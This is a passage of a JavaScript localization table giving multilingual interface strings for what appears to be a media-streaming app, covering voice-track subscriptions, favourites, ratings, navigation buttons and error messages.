		he: 'נקה סעיפים',
		pt: 'Limpar seções',
		ro: 'Ștergeți secțiunile'
	},
	title_fork_clear_descr: {
		ru: 'Будет выполнена очистка всех выбранных разделов',
		uk: 'Буде виконано очищення всіх вибраних розділів',
		en: 'All selected partitions will be cleared',
		be: 'Будзе выканана ачыстка ўсіх абраных раздзелаў',
		zh: '将清除所有已选分类',
		bg: 'Всички избрани дялове ще бъдат изчистени',
		cs: 'Všechny vybrané oddíly budou vymazány',
		fr: 'Toutes les partitions sélectionnées seront effacées',
		he: 'כל המחיצות שנבחרו יימחקו',
		pt: 'Todas as partições selecionadas serão limpas',
		ro: 'Toate partițiile selectate vor fi șterse'
	},
	title_fork_clear_noty: {
		ru: 'Разделы успешно очищены',
		uk: 'Розділи успішно очищені',
		en: 'Partitions cleared successfully',
		be: 'Раздзелы паспяхова ачышчаны',
		zh: '分类已清空',
		bg: 'Дяловете са изчистени успешно',
		cs: 'Oddíly byly úspěšně vymazány',
		fr: 'Partitions effacées avec succès',
		he: 'המחיצות נוקו בהצלחה',
		pt: 'Partições limpas com sucesso',
		ro: 'Partițiile s-au șters cu succes'
	},
	title_fork_reload_code: {
		ru: 'Обновить код',
		uk: 'Оновити код',
		en: 'Update Code',
		be: 'Абнавіць код',
		zh: '更新代码',
		bg: 'Актуализирайте кода',
		cs: 'Aktualizovat kód',
		fr: 'Mettre à jour le code',
		he: 'עדכן את הקוד',
		pt: 'Atualizar código',
		ro: 'Actualizare cod'
	},
	title_fork_current: {
		ru: 'Текущий',
		uk: 'Поточний',
		en: 'Current',
		be: 'Бягучы',
		zh: '当前',
		bg: 'Текущ',
		cs: 'Proud',
		fr: 'Actuelle',
		he: 'נוֹכְחִי',
		pt: 'Atual',
		ro: 'Actual'
	},
	title_fork_new: {
		ru: 'Новый',
		uk: 'Новий',
		en: 'New',
		be: 'Новы',
		zh: '新',
		bg: 'Нов',
		cs: 'Nový',
		fr: 'Nouvelle',
		he: 'חָדָשׁ',
		pt: 'Nova',
		ro: 'Nou'
	},
	title_tv_clear_fav: {
		ru: 'Очистить избранное',
		uk: 'Очистити вибране',
		en: 'Clear Favorites',
		be: 'Ачысціць абранае',
		zh: '清空收藏',
		bg: 'Изчистване на любимите',
		cs: 'Vymazat oblíbené',
		fr: 'Effacer les favoris',
		he: 'נקה מועדפים',
		pt: 'Limpar favoritos',
		ro: 'Ștergeți Favoritele'
	},
	title_tv_clear__fav_descr: {
		ru: 'Будет выполнена очистка избранных каналов',
		uk: 'Буде виконано очищення обраних каналів',
		en: 'Favorite channels will be cleared',
		be: 'Будзе выканана ачыстка абраных каналаў',
		zh: '将清空收藏的频道',
		bg: 'Любимите канали ще бъдат изчистени',
		cs: 'Oblíbené kanály budou vymazány',
		fr: 'Les chaînes favorites seront effacées',
		he: 'הערוצים המועדפים יימחקו',
		pt: 'Os canais favoritos serão apagados',
		ro: 'Canalele favorite vor fi șterse'
	},
	title_tv_clear_fav_noty: {
		ru: 'Все избранные каналы удалены',
		uk: 'Усі вибрані канали видалені',
		en: 'All favorite channels have been deleted',
		be: 'Усе абраныя каналы выдалены',
		zh: '已删除所有收藏频道',
		bg: 'Всички любими канали са изтрити',
		cs: 'Všechny oblíbené kanály byly smazány',
		fr: 'Toutes les chaînes favorites ont été supprimées',
		he: 'כל הערוצים המועדפים נמחקו',
		pt: 'Todos os canais favoritos foram excluídos',
		ro: 'Toate canalele preferate au fost șterse'
	},
	succes_update_noty: {
		ru: 'успешно обновлён',
		uk: 'успішно оновлено',
		en: 'successfully updated',
		be: 'паспяхова абноўлена',
		zh: '更新成功',
		bg: 'успешно актуализиран',
		cs: 'úspěšně aktualizováno',
		fr: 'mis à jour avec succès',
		he: 'עודכן בהצלחה',
		pt: 'atualizado com sucesso',
		ro: 'actualizat cu succes'
	},
	title_enable_rating: {
		ru: 'Включить рейтинг',
		uk: 'Увiмкнути рейтинг',
		en: 'Enable rating',
		be: 'Уключыць рэйтынг',
		zh: '启用评分',
		bg: 'Активиране на оценката',
		cs: 'Povolit hodnocení',
		fr: 'Activer la notation',
		he: 'אפשר דירוג',
		pt: 'Ativar classificação',
		ro: 'Activați evaluarea'
	},
	title_enable_rating_descr: {
		ru: 'Отображает в карточке рейтинг Кинопоиск и IMDB',
		uk: 'Відображає у картці рейтинг Кінопошук та IMDB',
		en: 'Displays the Kinopoisk and IMDB rating in the card',
		be: 'Адображае ў картцы рэйтынг Кінопошук і IMDB',
		zh: '在卡片中显示 Kinopoisk 与 IMDB 评分',
		bg: 'Показва оценката на Kinopoisk и IMDB в картата',
		cs: 'Zobrazuje hodnocení Kinopoisk a IMDB na kartě',
		fr: 'Affiche la note Kinopoisk et IMDB sur la carte',
		he: 'מציג את דירוג Kinopoisk ו-IMDB בכרטיס',
		pt: 'Exibe a classificação Kinopoisk e IMDB no cartão',
		ro: 'Afișează ratingul Kinopoisk și IMDB pe card'
	},
	title_info_serial: {
		ru: 'Информация о карточке',
		uk: 'Інформація про картку',
		en: 'Card Information',
		be: 'Інфармацыя пра картку',
		zh: '卡片信息',
		bg: 'Информация за картата',
		cs: 'Informace o kartě',
		fr: 'Informations sur la carte',
		he: 'מידע על כרטיס',
		pt: 'Informações do cartão',
		ro: 'Informații card'
	},
	title_info_serial_descr: {
		ru: 'Отображает информацию о количестве серий в карточке, в том числе последнею серию на постере',
		uk: 'Відображає інформацію про кількість серій у картці, у тому числі останню серію на постері',
		en: 'Displays information about the number of episodes in the card, including the last episode on the poster',
		be: 'Адображае інфармацыю пра колькасць серый у картцы, у тым ліку апошнюю серыю на постары',
		zh: '在卡片中显示集数信息，包括海报上的最新一集',
		bg: 'Показва информация за броя на епизодите в картата, включително последния епизод на плаката',
		cs: 'Zobrazuje informace o počtu epizod na kartě, včetně poslední epizody na plakátu',
		fr: 'Affiche des informations sur le nombre d\'épisodes de la carte, y compris le dernier épisode sur l\'affiche',
		he: 'מציג מידע על מספר הפרקים בכרטיס, כולל הפרק האחרון בפוסטר',
		pt: 'Exibe informações sobre o número de episódios no cartão, incluindo o último episódio no pôster',
		ro: 'Afișează informații despre numărul de episoade din card, inclusiv ultimul episod de pe afiș'
	},
	title_add_butback: {
		ru: 'Включить кнопку "Назад"',
		uk: 'Увiмкнути кнопку "Назад"',
		en: 'Enable back button',
		be: 'Уключыць кнопку "Назад"',
		zh: '启用返回按钮',
		bg: 'Активиране на бутона за връщане назад',
		cs: 'Povolit tlačítko Zpět',
		fr: 'Activer le bouton retour',
		he: 'הפעל כפתור חזרה',
		pt: 'Ativar botão Voltar',
		ro: 'Activați butonul Înapoi'
	},
	title_add_butback_descr: {
		ru: 'Отображает внешнюю кнопку "Назад" для удобной навигации в полноэкраном режиме на различных смартфона',
		uk: 'Відображає зовнішню кнопку "Назад" для зручної навігації в повноекранному режимі на різних смартфонах',
		en: 'Displays an external back button for easy full-screen navigation on various smartphones',
		be: 'Адображае знешнюю кнопку "Назад" для зручнай навігацыі ў поўнаэкранным рэжыме на розных смартфонах',
		zh: '在全屏模式下显示外部返回按钮，便于在不同手机上导航',
		bg: 'Показва външен бутон за връщане назад за лесна навигация на цял екран на различни смартфони',
		cs: 'Zobrazuje externí tlačítko zpět pro snadnou navigaci na celé obrazovce na různých chytrých telefonech',
		fr: 'Affiche un bouton de retour externe pour une navigation facile en plein écran sur divers smartphones',
		he: 'מציג כפתור אחורה חיצוני לניווט קל במסך מלא בסמארטפונים שונים',
		pt: 'Exibe um botão traseiro externo para fácil navegação em tela cheia em vários smartphones',
		ro: 'Afișează un buton extern înapoi pentru o navigare ușoară pe tot ecranul pe diferite smartphone-uri'
	},
	title_butback_pos: {
		ru: 'Положение кнопки "Назад"',
		uk: 'Розташування кнопки "Назад"',
		en: 'Back button position',
		be: 'Становішча кнопкі "Назад"',
		zh: '返回按钮位置',
		bg: 'Позиция на бутона за връщане назад',
		cs: 'Poloha tlačítka zpět',
		fr: 'Position du bouton retour',
		he: 'מיקום כפתור חזרה',
		pt: 'Posição do botão Voltar',
		ro: 'Poziția butonului înapoi'
	},
	buttback_right: {
		ru: 'Справа',
		uk: 'Праворуч',
		en: 'Right',
		be: 'Справа',
		zh: '右侧',
		bg: 'вярно',
		cs: 'Právo',
		fr: 'Droite',
		he: 'יָמִינָה',
		pt: 'Certa',
		ro: 'Corect'
	},
	buttback_left: {
		ru: 'Слева',
		uk: 'Лiворуч',
		en: 'Left',
		be: 'Злева',
		zh: '左侧',
		bg: 'наляво',
		cs: 'Vlevo',
		fr: 'Gauche',
		he: 'שְׁמֹאל',
		pt: 'Esquerda',
		ro: 'Stânga'
	},
	title_close_app: {
		ru: 'Закрыть приложение',
		uk: 'Закрити додаток',
		en: 'Close application',
		be: 'Закрыць дадатак',
		zh: '关闭应用',
		bg: 'Затворете приложението',
		cs: 'Zavřete aplikaci',
		fr: 'Fermer l\'application',
		he: 'סגור אפליקציה',
		pt: 'Fechar aplicativo',
		ro: 'Închideți aplicația'
	},
	title_radio: {
		ru: 'Радио',
		uk: 'Радiо',
		en: 'Radio',
		be: 'Радыё',
		zh: '电台',
		bg: 'Радио',
		cs: 'Rádio',
		fr: 'Radio',
		he: 'רָדִיוֹ',
		pt: 'Rádio',
		ro: 'Radio'
	},
	modss_voice_tracks: {
		ru: 'Озвучки',
		uk: 'Озвучки',
		en: 'Voice tracks',
		be: 'Азвучкі',
		zh: '配音轨道',
		bg: 'Озвучки',
		cs: 'Dabingové stopy',
		fr: 'Pistes audio',
		he: 'רצועות דיבוב',
		pt: 'Faixas de áudio',
		ro: 'Piste audio'
	},
	modss_voice_subscribe: {
		ru: 'Подписаться на озвучку',
		uk: 'Підписатися на озвучку',
		en: 'Subscribe to voice',
		be: 'Падпісацца на азвучку',
		zh: '订阅配音',
		bg: 'Абонирайте се за озвучка',
		cs: 'Přihlásit se k dabingu',
		fr: 'S\'abonner au doublage',
		he: 'הירשם לדיבוב',
		pt: 'Inscrever-se na dublagem',
		ro: 'Abonare la dublaj'
	},
	modss_voice_open_card: {
		ru: 'Открыть карточку',
		uk: 'Відкрити картку',
		en: 'Open card',
		be: 'Адкрыць картку',
		zh: '打开卡片',
		bg: 'Отвори картата',
		cs: 'Otevřít kartu',
		fr: 'Ouvrir la fiche',
		he: 'פתיחת כרטיס',
		pt: 'Abrir ficha',
		ro: 'Deschide fișa'
	},
	modss_voice_subscription_menu_unsubscribe_hint: {
		ru: 'Потребуется подтверждение',
		uk: 'Потрібне підтвердження',
		en: 'Confirmation required',
		be: 'Патрабуецца пацвярджэнне',
		zh: '需要确认',
		bg: 'Необходимо е потвърждение',
		cs: 'Vyžaduje se potvrzení',
		fr: 'Confirmation requise',
		he: 'נדרש אישור',
		pt: 'Confirmação necessária',
		ro: 'Este necesară confirmarea'
	},
	modss_voice_unsubscribe: {
		ru: 'Отписаться от озвучки',
		uk: 'Відписатися від озвучки',
		en: 'Unsubscribe from voice',
		be: 'Адпісацца ад азвучкі',
		zh: '取消订阅配音',
		bg: 'Отпиши се от озвучката',
		cs: 'Odhlásit dabing',
		fr: 'Se désabonner du doublage',
		he: 'ביטול מנוי לדיבוב',
		pt: 'Cancelar inscrição na dublagem',
		ro: 'Dezabonare de la dublaj'
	},
	modss_voice_subscriptions: {
		ru: 'Мои подписки на озвучки',
		uk: 'Мої підписки на озвучки',
		en: 'My voice subscriptions',
		be: 'Мае падпіскі на азвучкі',
		zh: '我的配音订阅',
		bg: 'Моите абонаменти за озвучки',
		cs: 'Moje odběry dabingu',
		fr: 'Mes abonnements doublage',
		he: 'המנויים שלי לדיבוב',
		pt: 'As minhas subscrições de dublagem',
		ro: 'Abonamentele mele la dublaj'
	},
	modss_voice_subscribe_success: {
		ru: 'Вы успешно подписались на озвучку',
		uk: 'Ви успішно підписалися на озвучку',
		en: 'You have successfully subscribed to voice',
		be: 'Вы паспяхова падпісаліся на азвучку',
		zh: '您已成功订阅配音',
		bg: 'Успешно се абонирахте за озвучката',
		cs: 'Úspěšně jste se přihlásili k dabingu',
		fr: 'Vous êtes abonné au doublage',
		he: 'נרשמת בהצלחה לדיבוב',
		pt: 'Inscrição na dublagem realizada com sucesso',
		ro: 'V-ați abonat cu succes la dublaj'
	},
	modss_voice_unsubscribe_success: {
		ru: 'Вы успешно отписались от озвучки',
		uk: 'Ви успішно відписалися від озвучки',
		en: 'You have successfully unsubscribed from voice',
		be: 'Вы паспяхова адпісаліся ад азвучкі',
		zh: '您已成功取消订阅配音',
		bg: 'Успешно се отписахте от озвучката',
		cs: 'Úspěšně jste se odhlásili z dabingu',
		fr: 'Vous vous êtes désabonné du doublage',
		he: 'ביטלת את המנוי לדיבוב בהצלחה',
		pt: 'Cancelou a subscrição da dublagem com sucesso',
		ro: 'V-ați dezabonat cu succes de la dublaj'
	},
	modss_ws_logoff_reload: {
		ru: 'Сессия устройства отозвана. Перезапуск…',
		uk: 'Сесію пристрою відкликано. Перезапуск…',
		en: 'Device session revoked. Restarting…',
		be: 'Сэсію прылады адклікана. Перазапуск…',
		zh: '设备会话已撤销。正在重启…',
		bg: 'Сесията на устройството е отменена. Рестартира се...',
		cs: 'Relace zařízení byla zrušena. Restartování…',
		fr: 'Session de l\'appareil révoquée. Redémarrage…',
		he: 'הפעלת המכשיר בוטלה. מופעל מחדש...',
		pt: 'Sessão do dispositivo revogada. Reiniciando…',
		ro: 'Sesiunea dispozitivului a fost revocată. Se repornește…'
	},
	modss_voice_subscribe_error: {
		ru: 'Ошибка при подписке на озвучку',
		uk: 'Помилка при підписці на озвучку',
		en: 'Error subscribing to voice',
		be: 'Памылка пры падпісцы на азвучку',
		zh: '订阅配音时出错',
		bg: 'Грешка при абониране за озвучка',
		cs: 'Chyba při přihlášení k dabingu',
		fr: 'Erreur lors de l\'abonnement au doublage',
		he: 'שגיאה בהרשמה לדיבוב',
		pt: 'Erro ao subscrever a dublagem',
		ro: 'Eroare la abonarea la dublaj'
	},
	modss_voice_subscriptions_only_series: {
		ru: 'Подписки доступны только для сериалов',
		uk: 'Підписки доступні тільки для серіалів',
		en: 'Subscriptions are only available for series',
		be: 'Падпіскі даступны толькі для серыялаў',
		zh: '订阅仅适用于系列',
		bg: 'Абонаментите са налични само за сериали',
		cs: 'Odběry jsou k dispozici pouze pro seriály',
		fr: 'Les abonnements sont réservés aux séries',
		he: 'מנויים זמינים רק לסדרות',
		pt: 'As subscrições estão disponíveis apenas para séries',
		ro: 'Abonamentele sunt disponibile doar pentru seriale'
	},
	modss_voice_manage_subscriptions: {
		ru: 'Управление всеми подписками',
		uk: 'Управління всіма підписками',
		en: 'Manage all subscriptions',
		be: 'Кіраванне ўсімі падпіскамі',
		zh: '管理所有订阅',
		bg: 'Управление на всички абонаменти',
		cs: 'Spravovat všechny odběry',
		fr: 'Gérer tous les abonnements',
		he: 'ניהול כל המנויים',
		pt: 'Gerir todas as subscrições',
		ro: 'Gestionați toate abonamentele'
	},
	modss_voice_no_subscriptions: {
		ru: 'У вас пока нет подписок',
		uk: 'У вас поки немає підписок',
		en: 'You have no subscriptions yet',
		be: 'У вас пакуль няма падпісак',
		zh: '您还没有订阅',
		bg: 'Все още нямате абонаменти',
		cs: 'Zatím nemáte žádné odběry',
		fr: 'Vous n\'avez pas encore d\'abonnement',
		he: 'עדיין אין לך מנויים',
		pt: 'Ainda não tem subscrições',
		ro: 'Nu aveți încă abonamente'
	},
	modss_voice_subscription_removed: {
		ru: 'Подписка удалена',
		uk: 'Підписка видалена',
		en: 'Subscription removed',
		be: 'Падпіска выдалена',
		zh: '订阅已删除',
		bg: 'Абонаментът е премахнат',
		cs: 'Odběr byl odstraněn',
		fr: 'Abonnement supprimé',
		he: 'המנוי הוסר',
		pt: 'Subscrição removida',
		ro: 'Abonament eliminat'
	},
	modss_voice_confirm_unsubscribe: {
		ru: 'Подтвердите отписку',
		uk: 'Підтвердіть відписку',
		en: 'Confirm unsubscribe',
		be: 'Пацвердзіце адпіску',
		zh: '确认取消订阅',
		bg: 'Потвърдете отписването',
		cs: 'Potvrďte odhlášení',
		fr: 'Confirmer la désinscription',
		he: 'אשר ביטול מנוי',
		pt: 'Confirmar cancelamento',
		ro: 'Confirmați dezabonarea'
	},
	modss_voice_yes_unsubscribe: {
		ru: 'Да, отписаться',
		uk: 'Так, відписатися',
		en: 'Yes, unsubscribe',
		be: 'Так, адпісацца',
		zh: '是的，取消订阅',
		bg: 'Да, отпиши се',
		cs: 'Ano, odhlásit',
		fr: 'Oui, me désabonner',
		he: 'כן, בטל מנוי',
		pt: 'Sim, cancelar',
		ro: 'Da, dezabonare'
	},
	modss_voice_cancel: {
		ru: 'Отмена',
		uk: 'Скасувати',
		en: 'Cancel',
		be: 'Скасаваць',
		zh: '取消',
		bg: 'Отказ',
		cs: 'Zrušit',
		fr: 'Annuler',
		he: 'ביטול',
		pt: 'Cancelar',
		ro: 'Anulare'
	},
	modss_voice_leave_subscription: {
		ru: 'Оставить подписку',
		uk: 'Залишити підписку',
		en: 'Keep subscription',
		be: 'Пакінуць падпіску',
		zh: '保留订阅',
		bg: 'Запази абонамента',
		cs: 'Ponechat odběr',
		fr: 'Garder l\'abonnement',
		he: 'השאר מנוי',
		pt: 'Manter subscrição',
		ro: 'Păstrați abonamentul'
	},
	modss_voice_already_subscribed: {
		ru: 'Вы уже подписаны на эту озвучку',
		uk: 'Ви вже підписані на цю озвучку',
		en: 'You are already subscribed to this voice',
		be: 'Вы ўжо падпісаны на гэтую азвучку',
		zh: '您已订阅此配音',
		bg: 'Вече сте абонирани за тази озвучка',
		cs: 'Již jste přihlášeni k tomuto dabingu',
		fr: 'Vous êtes déjà abonné à ce doublage',
		he: 'כבר רשום לדיבוב הזה',
		pt: 'Já está inscrito nesta dublagem',
		ro: 'Sunteți deja abonat la acest dublaj'
	},
	modss_voice_subscription_changed: {
		ru: 'Подписка изменена на',
		uk: 'Підписку змінено на',
		en: 'Subscription changed to',
		be: 'Падпіска зменена на',
		zh: '订阅已更改为',
		bg: 'Абонаментът е променен на',
		cs: 'Odběr změněn na',
		fr: 'Abonnement modifié pour',
		he: 'המנוי השתנה ל-',
		pt: 'Subscrição alterada para',
		ro: 'Abonament schimbat la'
	},
	modss_voice_notice_label_voice: {
		ru: 'Озвучка',
		uk: 'Озвучка',
		en: 'Voice',
		be: 'Азвучка',
		zh: '配音',
		bg: 'Озвучка',
		cs: 'Dabing',
		fr: 'Doublage',
		he: 'דיבוב',
		pt: 'Dublagem',
		ro: 'Dublaj'
	},
	modss_voice_notice_label_sources: {
		ru: 'Источники',
		uk: 'Джерела',
		en: 'Sources',
		be: 'Крыніцы',
		zh: '来源',
		bg: 'Източници',
		cs: 'Zdroje',
		fr: 'Sources',
		he: 'מקורות',
		pt: 'Fontes',
		ro: 'Surse'
	},
	modss_voice_notice_label_new_src: {
		ru: 'Новые источники',
		uk: 'Нові джерела',
		en: 'New sources',
		be: 'Новыя крыніцы',
		zh: '新来源',
		bg: 'Нови източници',
		cs: 'Nové zdroje',
		fr: 'Nouvelles sources',
		he: 'מקורות חדשים',
		pt: 'Novas fontes',
		ro: 'Surse noi'
	},
	modss_voice_notice_episodes: {
		ru: 'Серии',
		uk: 'Серії',
		en: 'Episodes',
		be: 'Серыі',
		zh: '剧集',
		bg: 'Епизоди',
		cs: 'Epizody',
		fr: 'Épisodes',
		he: 'פרקים',
		pt: 'Episódios',
		ro: 'Episoade'
	},
	modss_voice_notice_new_ep_in_voice: {
		ru: 'Новая серия в озвучке',
		uk: 'Нова серія в озвучці',
		en: 'New episode, voice',
		be: 'Новая серыя ў азвучцы',
		zh: '新剧集，配音',
		bg: 'Нов епизод с озвучка',
		cs: 'Nová epizoda v dabingu',
		fr: 'Nouvel épisode (doublage)',
		he: 'פרק חדש בדיבוב',
		pt: 'Novo episódio na dublagem',
		ro: 'Episod nou în dublaj'
	},
	modss_notice_translations_on_balancers: {
		ru: 'Переводы на балансерах где есть {episode} серия',
		uk: 'Переклади на балансерах, де є {episode} серія',
		en: 'Translations on sources with episode {episode}',
		be: 'Пераклады на балансерах, дзе ёсць {episode} серыя',
		zh: '在有第 {episode} 集的来源上的翻译',
		bg: 'Преводи на балансери, където има {episode} серия',
		cs: 'Překlady na balancerech, kde je {episode} epizoda',
		fr: 'Traductions sur les sources où l\'épisode {episode} est disponible',
		he: 'תרגומים במאזנים שבהם יש פרק {episode}',
		pt: 'Traduções nos balanceadores onde há o episódio {episode}',
		ro: 'Traduceri pe balancere unde există episodul {episode}'
	},
	menu_voice: {
		ru: 'озвучек',
		uk: 'озвучок',
		en: 'voices',
		be: 'азвучак',
		zh: '配音',
		bg: 'озвучки',
		cs: 'dabingů',
		fr: 'doublages',
		he: 'דיבובים',
		pt: 'dublagens',
		ro: 'dublaje'
	},
	modss_voice_limit_reached_title: {
		ru: 'Лимит подписок',
		uk: 'Ліміт підписок',
		en: 'Subscription limit',
		be: 'Ліміт падпісак',
		zh: '订阅限制',
		bg: 'Лимит на абонаментите',
		cs: 'Limit odběrů',
		fr: 'Limite d\'abonnements',
		he: 'מגבלת מנויים',
		pt: 'Limite de subscrições',
		ro: 'Limită abonamente'
	},
	modss_voice_limit_reached_message: {
		ru: 'Вы достигли максимального количества подписок',
		uk: 'Ви досягли максимальної кількості підписок',
		en: 'You have reached the maximum number of subscriptions',
		be: 'Вы дасягнулі максімальнай колькасці падпісак',
		zh: '您已达到最大订阅数量',
		bg: 'Достигнахте максималния брой абонаменти',
		cs: 'Dosáhli jste maximálního počtu odběrů',
		fr: 'Vous avez atteint le nombre maximum d\'abonnements',
		he: 'הגעת למספר המקסימלי של מנויים',
		pt: 'Atingiu o número máximo de subscrições',
		ro: 'Ați atins numărul maxim de abonamente'
	},
	modss_voice_limit_reached_hint: {
		ru: 'Удалите одну из существующих подписок<br>чтобы добавить новую',
		uk: 'Видаліть одну з існуючих підписок<br>щоб додати нову',
		en: 'Delete one of the existing subscriptions<br>to add a new one',
		be: 'Выдаліце адну з існуючых падпісак<br>каб дадаць новую',
		zh: '删除现有订阅之一<br>以添加新订阅',
		bg: 'Изтрийте един от съществуващите абонаменти<br>за да добавите нов',
		cs: 'Smažte jeden ze stávajících odběrů<br>chcete-li přidat nový',
		fr: 'Supprimez l\'un des abonnements existants<br>pour en ajouter un nouveau',
		he: 'מחק מנוי קיים אחד<br>כדי להוסיף חדש',
		pt: 'Elimine uma das subscrições existentes<br>para adicionar uma nova',
		ro: 'Ștergeți unul dintre abonamentele existente<br>pentru a adăuga unul nou'
	},
	modss_voice_limit_close: {
		ru: 'Закрыть',
		uk: 'Закрити',
		en: 'Close',
		be: 'Закрыць',
		zh: '关闭',
		bg: 'Затвори',
		cs: 'Zavřít',
		fr: 'Fermer',
		he: 'סגור',
		pt: 'Fechar',
		ro: 'Închideți'
	},
	modss_voice_limit_my_subscriptions: {
		ru: 'Мои подписки',
		uk: 'Мої підписки',
		en: 'My subscriptions',
		be: 'Мае падпіскі',
		zh: '我的订阅',
		bg: 'Моите абонаменти',
		cs: 'Moje odběry',
		fr: 'Mes abonnements',
		he: 'המנויים שלי',
		pt: 'As minhas subscrições',
		ro: 'Abonamentele mele'
	},
	modss_voice_active_subscriptions: {
		ru: 'активных подписок',
		uk: 'активних підписок',
		en: 'active subscriptions',
		be: 'актыўных падпісак',
		zh: '活跃订阅',
		bg: 'активни абонамента',
		cs: 'aktivních odběrů',
		fr: 'abonnements actifs',
		he: 'מנויים פעילים',
		pt: 'subscrições ativas',
		ro: 'abonamente active'
	},
	modss_voice_tab_active: {
		ru: 'Активные',
		uk: 'Активні',
		en: 'Active',
		be: 'Актыўныя',
		zh: '活跃',
		bg: 'Активни',
		cs: 'Aktivní',
		fr: 'Actifs',
		he: 'פעילים',
		pt: 'Ativas',
		ro: 'Active'
	},
	modss_voice_tab_paused: {
		ru: 'На паузе',
		uk: 'На паузі',
		en: 'On pause',
		be: 'На паузе',
		zh: '已暂停',
		bg: 'На пауза',
		cs: 'Pozastaveno',
		fr: 'En pause',
		he: 'בהשהיה',
		pt: 'Em pausa',
		ro: 'În pauză'
	},
	modss_voice_subscriptions_section: {
		ru: 'Подписки MODS',
		uk: 'Підписки MODS',
		en: 'MODS subscriptions',
		be: 'Падпіскі MODS',
		zh: 'MODS 订阅',
		bg: 'MODS абонаменти',
		cs: 'MODS odběry',
		fr: 'Abonnements MODS',
		he: 'מנויי MODS',
		pt: 'Subscrições MODS',
		ro: 'Abonamente MODS'
	},
	online_vip_available: {
		ru: 'Доступно в VIP подписке',
		uk: 'Доступно в VIP підписці',
		en: 'Available in VIP subscription',
		be: 'Даступна ў VIP падписцы',
		zh: 'VIP 订阅可用',
		bg: 'Предлага се във VIP абонамент',
		cs: 'K dispozici ve VIP předplatném',
		fr: 'Disponible en abonnement VIP',
		he: 'זמין במנוי VIP',
		pt: 'Disponível na assinatura VIP',
		ro: 'Disponibil în abonament VIP'
	},
	voice_dub: {
		ru: 'дубляж',
		uk: 'дубляж',
		en: 'dubbing',
		be: 'дубляж',
		zh: '配音',
		bg: 'дублаж',
		cs: 'dabing',
		fr: 'doublage',
		he: 'דִבּוּב',
		pt: 'dublagem',
		ro: 'dublare'
	},
	voice_original: {
		ru: 'оригинал',
		uk: 'оригінал',
		en: 'original',
		be: 'арыгінал',
		zh: '原声',
		bg: 'оригинален',
		cs: 'originál',
		fr: 'originale',
		he: 'מְקוֹרִי',
		pt: 'original',
		ro: 'original'
	},
	error_prefix: {
		ru: 'Ошибка: ',
		uk: 'Помилка: ',
		en: 'Error: ',
		be: 'Памылка: ',
		zh: '错误：',
		bg: 'грешка:',
		cs: 'Chyba:',
		fr: 'Erreur:',
		he: 'שְׁגִיאָה:',
		pt: 'Erro:',
		ro: 'Eroare:'
	},
	error_occurred: {
		ru: 'Произошла ошибка',
		uk: 'Сталася помилка',
		en: 'An error occurred',
		be: 'Адбылася памылка',
		zh: '发生错误',
		bg: 'Възникна грешка',
		cs: 'Došlo k chybě',
		fr: 'Une erreur s\'est produite',
		he: 'אירעה שגיאה',
		pt: 'Ocorreu um erro',
		ro: 'A apărut o eroare'
	},
	stream_prefix: {
		ru: 'Поток ',
		uk: 'Потік ',
		en: 'Stream ',
		be: 'Паток ',
		zh: '流 ',
		bg: 'Поток',
		cs: 'Proud',
		fr: 'Flux',
		he: 'זֶרֶם',
		pt: 'Fluxo',
		ro: 'Flux'
	},
	error_file_send: {
		ru: 'Ошибка при отправке файла: ',
		uk: 'Помилка при відправці файла: ',
		en: 'Error sending file: ',
		be: 'Памылка пры адпраўцы файла: ',
		zh: '发送文件错误：',
		bg: 'Грешка при изпращане на файл:',
		cs: 'Chyba při odesílání souboru:',
		fr: 'Erreur lors de l\'envoi du fichier :',
		he: 'שגיאה בשליחת הקובץ:',
		pt: 'Erro ao enviar arquivo:',
		ro: 'Eroare la trimiterea fișierului:'
	},
	error_file_send_simple: {
		ru: 'Ошибка при отправке файла',
		uk: 'Помилка при відправці файла',
		en: 'Error sending file',
		be: 'Памылка пры адпраўцы файла',
		zh: '发送文件错误',
		bg: 'Грешка при изпращане на файл',
		cs: 'Chyba při odesílání souboru',
		fr: 'Erreur lors de l\'envoi du fichier',
		he: 'שגיאה בשליחת הקובץ',
		pt: 'Erro ao enviar arquivo',
		ro: 'Eroare la trimiterea fișierului'
	},
	error_archive_load: {
		ru: 'Ошибка загрузки архива: ',
		uk: 'Помилка завантаження архіву: ',
		en: 'Error loading archive: ',
		be: 'Памылка загрузкі архіву: ',
		zh: '加载归档错误：',
		bg: 'Грешка при зареждане на архива:',
		cs: 'Chyba při načítání archivu:',
		fr: 'Erreur de chargement des archives :',
		he: 'שגיאה בטעינת הארכיון:',
		pt: 'Erro ao carregar arquivo:',
		ro: 'Eroare la încărcarea arhivei:'
	},
	error_archive_url_empty: {
		ru: 'Ошибка загрузки архива URL не должен быть пустой',
		uk: 'Помилка завантаження архіву URL не повинен бути порожнім',
		en: 'Error loading archive URL must not be empty',
		be: 'Памылка загрузкі архіву URL не павінен быць пустым',
		zh: '加载归档错误：URL 不能为空',
		bg: 'Грешка при зареждане на архива URL адресът не трябва да е празен',
		cs: 'Chyba při načítání archivu URL nesmí být prázdné',
		fr: 'Erreur de chargement de l\'URL de l\'archive ne doit pas être vide',
		he: 'שגיאה בטעינת כתובת האתר של הארכיון לא יכולה להיות ריקה',
		pt: 'Erro ao carregar o URL do arquivo não deve estar vazio',
		ro: 'Eroare la încărcarea URL-ului arhivei nu trebuie să fie necompletat'
	},
	error_archive_load_simple: {
		ru: 'Ошибка загрузки архива',
		uk: 'Помилка завантаження архіву',
		en: 'Error loading archive',
		be: 'Памылка загрузкі архіву',
		zh: '加载归档错误',
		bg: 'Грешка при зареждането на архива',
		cs: 'Při načítání archivu došlo k chybě',
		fr: 'Erreur de chargement des archives',
		he: 'שגיאה בטעינת הארכיון',
		pt: 'Erro ao carregar arquivo',
		ro: 'Eroare la încărcarea arhivei'
	},
	all_seasons: {
		ru: 'Все сезоны',
		uk: 'Всі сезони',
		en: 'All seasons',
		be: 'Усе сезоны',
		zh: '全部季',
		bg: 'Всички сезони',
		cs: 'Všechna roční období',
		fr: 'Toutes les saisons',
		he: 'כל העונות',
		pt: 'Todas as temporadas',
		ro: 'Toate anotimpurile'
	},
	season_prefix: {
		ru: 'Сезон ',
		uk: 'Сезон ',
		en: 'Season ',
		be: 'Сезон ',
		zh: '第 ',
		bg: 'Сезон',
		cs: 'Sezóna',
		fr: 'Saison',
		he: 'עוֹנָה',
		pt: 'Temporada',
		ro: 'Sezon'
	},
	season_one: {
		ru: 'Сезон 1',
		uk: 'Сезон 1',
		en: 'Season 1',
		be: 'Сезон 1',
		zh: '第 1 季',
		bg: 'Сезон 1',
		cs: 'sezóna 1',
		fr: 'Saison 1',
		he: 'עונה 1',
		pt: 'Temporada 1',
